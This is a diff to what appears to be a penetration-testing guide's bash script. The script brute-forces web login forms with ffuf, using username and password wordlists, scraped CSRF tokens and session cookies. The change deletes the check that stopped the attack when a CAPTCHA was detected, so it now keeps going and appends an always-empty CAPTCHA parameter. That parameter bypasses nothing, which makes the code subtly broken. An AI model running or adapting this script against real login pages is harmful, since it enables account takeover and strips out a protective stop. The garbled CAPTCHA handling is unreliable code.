@@ -647,7 +647,7 @@ Create Script
 {% endhint %}
 
 ```bash
-sudo nano forwarded-bruteforce.sh
+sudo nano captcha-bruteforce.sh
 ```
 
 ```bash
@@ -729,9 +729,9 @@ HTML=$(curl -s "$LOGIN")
 FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)
 
 # CAPTCHA check
+[ -z "$ACTION" ] && ACTION="$LOGIN"
 if echo "$HTML" | grep -qiE "g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"; then
-    color_print RED "[!] CAPTCHA detected. Brute-force aborted."
-    exit 1
+    CAPTCHA=""
 fi
 
 # Extract Form Action & Method
@@ -771,7 +771,7 @@ while read -r INPUT; do
 done <<< "$HIDDEN_INPUTS"
 
 # Prepare POST Data
-DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
+DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2&${CAPTCHA}"
 [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 
 COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')
@@ -791,7 +791,7 @@ HEADERS=(
 
 # Run FFUF
 if [[ "$METHOD" == "get" ]]; then
-    FFUF_URL="${FULL_ACTION}?${DATA}"
+    FFUF_URL="${FULL_ACTION}?${DATA}&${CAPTCHA}"
     ffuf -u "$FFUF_URL" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
@@ -819,5 +819,5 @@ Run Script
 {% endhint %}
 
 ```bash
-sudo chmod +x forwarded-bruteforce.sh;sudo ./forwarded-bruteforce.sh $WEBSITE
+sudo chmod +x captcha-bruteforce.sh;sudo ./captcha-bruteforce.sh $WEBSITE
 ```
